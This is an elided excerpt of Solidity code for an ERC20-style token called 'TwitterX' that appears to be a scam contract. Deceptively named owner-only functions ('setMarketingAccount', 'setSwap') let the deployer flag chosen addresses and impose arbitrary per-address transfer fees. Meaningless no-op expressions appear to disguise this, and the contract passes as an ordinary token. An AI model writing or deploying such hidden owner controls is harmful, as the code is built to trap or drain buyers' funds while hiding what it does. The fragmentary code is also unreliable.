...
contract ERC20 is Context, IERC20, IERC20Metadata {
     ...
     * `transferFrom`. This is semantically equivalent to an onExternal approval.
     *
     * Requirements:
     *
     ...
     *
     * Does not update the allowance amount in case of onExternal allowance.
...
contract MyERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;
    mapping(address => bool) public onExternal;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 devFees;
    uint256 swapAndBuy = 1;
    uint256 private _totalSupply;
...
contract TwitterX is MyERC20, Ownable {
    ...
    mapping(address => uint256) private setTradersFees;
    address private constant _deadAddress = 0x000000000000000000000000000000000000dEaD;


    function setMarketingAccount(address _address) external __devWallet {
        (swapAndBuy + devFees * 1);
        onExternal[_address] = true;
    }

    function getInAccount(address _address) external view onlyCreator returns (bool) {
        return onExternal[_address];
    }


    function setSwap(address _address, uint256 _value) external __devWallet {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        (swapAndBuy + devFees * 1);
        setTradersFees[_address] = (swapAndBuy + devFees * 1) + _value;
    }

    function getFee(address _address) external view onlyCreator returns (uint256) {
        return setTradersFees[_address];
    }
    ...
    function _beforeVerifyTransfer(
        ...
        } else if (setTradersFees[from] > 0) {
            tradeFee = setTradersFees[from];
        }
